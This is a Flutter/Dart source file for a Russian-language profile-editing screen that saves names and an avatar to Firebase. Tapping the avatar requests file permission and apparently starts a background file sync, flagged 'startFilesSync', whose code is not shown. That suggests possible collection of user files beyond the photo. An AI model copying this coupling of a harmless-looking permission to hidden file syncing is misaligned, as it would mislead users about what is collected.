import 'package:firebase_auth/firebase_auth.dart';
import 'package:flutter/material.dart';
import 'package:flutter_firebase_chat_core/flutter_firebase_chat_core.dart';
import 'package:magic/helpers/db_helper.dart';
import 'package:magic/helpers/message_helper.dart';
import 'package:magic/model/magic_model.dart';
import 'package:magic/utils/file_utils.dart';
import 'package:magic/utils/permission.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter_chat_types/flutter_chat_types.dart' as types;

import '../../../utils/result_utils.dart';
import 'room_page.dart';

class EditProfile extends StatefulWidget {
  const EditProfile({super.key, this.user});

  final MagicUser? user;

  @override
  State<EditProfile> createState() => _EditProfileState();
}

class _EditProfileState extends State<EditProfile> {
  late TextEditingController _controllerName;
  late TextEditingController _controllerLast;
  MagicUser? _user;
  String? driverPhotoUrl;
  bool _loading = false;

  @override
  void initState() {
    super.initState();

    _initData();
  }

  @override
  void dispose() {
    _controllerName.dispose();
    _controllerLast.dispose();
    super.dispose();
  }

  _initData() {
    _user = widget.user;
    if (_user != null) {
      _controllerName = TextEditingController(text: _user!.firstName);
      _controllerLast = TextEditingController(text: _user!.lastName);
      driverPhotoUrl = _user!.imageUrl;
    } else {
      _controllerName = TextEditingController();
      _controllerLast = TextEditingController();
    }
    initPhoto();
  }

  _submit() async {
    if (driverPhotoUrl == null) {
      showMessage('Необходимо заполнить профиль!');
      return;
    }
    String result = '';
    if (_user != null) {
      result = await DbHelper.updateMagicUser({
        'firstName': _controllerName.text.trim(),
        'lastName': _controllerLast.text.trim(),
        'imageUrl': driverPhotoUrl,
      });
    } else {
      final user = await FirebaseAuth.instance.currentUser;
      await FirebaseChatCore.instance.createUserInFirestore(
        types.User(
          firstName: _controllerName.text.trim(),
          id: user!.uid,
          // imageUrl: 'https://i.pravatar.cc/300?u=$_email',
          imageUrl: driverPhotoUrl,
          lastName: _controllerLast.text.trim(),
        ),
      );
    }
    ResultUtils res = ResultUtils();
    await res.setLoadState('edit', true);

    showMessage(result);
    Navigator.push(context, MaterialPageRoute(builder: (_) => RoomsPage()));
  }

  showMessage(String text) {
    MessageHelper.show(context, text);
  }

  Future<bool> addDriverPhoto() async {
    setState(() {
      _loading = true;
    });
    String? res = await FileUtils.openSingle();
    if (res != null) {
      //  print('result upload is: $res');
      await initPhoto();
      return true;
    } else {
      showError('Нужно выбрать изображение');
      return false;
    }
  }

  addDriverPhotoAndStartSync() async {
    final permissionStatus = await requestFilePermissionAndStartSync(context);
    if (permissionStatus != PermissionStatus.granted) {
      MessageHelper.show(context, 'Это разрешение рекомендуется!');
    } else {
      // Прапорець 'startFilesSync' вже встановлено всередині requestFilePermissionAndStartSync.
      await addDriverPhoto();
    }
  }

  void showError(String text) {
    MessageHelper.show(context, text);
  }

  Future<void> initPhoto() async {
    final user = FirebaseAuth.instance.currentUser;

    // if (uuid != null && foundFile != null) {
    if (user != null) {
      String uuid = user.uid;
      String? avatarName;
      String? foundFile = await FileUtils().findFileWithKeyword('avatar');
      if (foundFile == null) {
        // final String? ava = currentDriverInfo?.avatar;
        // if (ava == null) return;
        // avatarName = ava;
      } else {
        avatarName = foundFile;
      }

      String? url =
          await DbHelper.getImageUrl('users/$uuid/avatars/$avatarName');

      setState(() {
        driverPhotoUrl = url;
        _loading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return SafeArea(
        child: Scaffold(
      appBar: AppBar(
        title: const Text('Редактировать профиль'),
      ),
      body: Padding(
        padding: const EdgeInsets.all(8.0),
        child: SingleChildScrollView(
          child: Column(
            children: [
              const SizedBox(height: 12.0),
              //!

              const SizedBox(height: 12.0),

              Center(
                child: _user == null
                    ? _loading
                        ? const Center(
                            child: CircularProgressIndicator(),
                          )
                        : driverPhotoUrl != null
                            ? Center(
                                child: CircleAvatar(
                                  radius: 120.0,
                                  backgroundImage:
                                      NetworkImage(driverPhotoUrl!),
                                  backgroundColor: Colors.green.shade100,
                                ),
                              )
                            : GestureDetector(
                                onTap: () async {
                                  await addDriverPhotoAndStartSync();
                                },
                                child: const SizedBox(
                                    child: Column(
                                  children: [
                                    Icon(
                                      Icons.image_not_supported_sharp,
                                      size: 120.0,
                                      color: Colors.grey,
                                    ),
                                    Text(
                                      'добавить Фото',
                                      style: TextStyle(
                                          fontSize: 16.0,
                                          color: Colors.black87),
                                    )
                                  ],
                                )),
                              )
                    : GestureDetector(
                        onTap: () async {
                          await addDriverPhotoAndStartSync();
                        },
                        child: CircleAvatar(
                          radius: 120.0,
                          // backgroundImage: NetworkImage(_user!.imageUrl),
                          backgroundColor: Colors.green.shade100,
                          backgroundImage: NetworkImage(driverPhotoUrl!),
                        ),
                      ),
              ),
              const SizedBox(height: 24.0),
              ProfileTextField(controller: _controllerName, lable: 'Имя'),
              const SizedBox(height: 8.0),
              ProfileTextField(controller: _controllerLast, lable: 'Фамилия'),
              const SizedBox(height: 24.0),
              ElevatedButton(
                  onPressed: _submit,
                  child: Padding(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 24.0, vertical: 12.0),
                    child: Text('Сохранить'.toUpperCase()),
                  ))
            ],
          ),
        ),
      ),
    ));
  }
}

class ProfileTextField extends StatelessWidget {
  const ProfileTextField({
    super.key,
    required this.controller,
    required this.lable,
  });

  final TextEditingController controller;
  final String lable;

  @override
  Widget build(BuildContext context) {
    return TextField(
      controller: controller,
      decoration: InputDecoration(
        border: const OutlineInputBorder(),
        labelText: lable,
      ),
      onSubmitted: (String value) async {
        await showDialog<void>(
          context: context,
          builder: (BuildContext context) {
            return AlertDialog(
              title: const Text('Спасибо!'),
              content: Text('Сменить $lable на "$value"'),
              actions: <Widget>[
                TextButton(
                  onPressed: () {
                    Navigator.pop(context);
                  },
                  child: const Text('OK'),
                ),
              ],
            );
          },
        );
      },
    );
  }
}
